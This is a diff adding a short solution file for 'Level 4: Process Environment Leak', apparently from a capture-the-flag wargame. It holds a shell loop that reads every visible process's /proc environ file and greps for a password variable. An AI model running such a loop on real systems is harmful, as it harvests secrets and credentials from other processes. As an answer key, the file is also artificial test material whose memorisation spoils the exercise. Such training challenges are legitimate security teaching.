@@ -1,0 +1,7 @@
+SOLUTION — Level 4: Process Environment Leak
+
+# Search all visible processes for environment variables
+# containing the next level password
+for pid in /proc/[0-9]*; do
+  cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep NEXT_PASSWORD
+done
